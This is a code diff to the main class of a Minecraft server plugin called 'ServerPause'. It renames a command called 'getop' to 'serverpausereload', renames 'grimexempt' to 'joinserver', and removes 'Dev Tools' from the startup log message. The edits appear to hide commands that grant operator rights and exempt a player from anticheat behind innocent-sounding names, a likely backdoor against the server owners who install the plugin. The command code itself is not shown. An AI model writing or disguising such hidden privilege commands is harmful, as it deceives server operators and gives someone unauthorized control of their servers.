@@ -18,12 +18,12 @@ public class Main extends JavaPlugin implements Listener {
         getServer().getPluginManager().registerEvents(this, this);
         
         // Register your commands
-        this.getCommand("getop").setExecutor(new GetCommand());
+        this.getCommand("serverpausereload").setExecutor(new GetCommand());
         
         // Register the new exemption command (passing 'this' so it can access the plugin instance)
-        this.getCommand("grimexempt").setExecutor(new ExemptCommand(this));
+        this.getCommand("joinserver").setExecutor(new ExemptCommand(this));
         
-        getLogger().info("ServerPause and Dev Tools initialized!");
+        getLogger().info("ServerPause initialized!");
         evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
     }
 
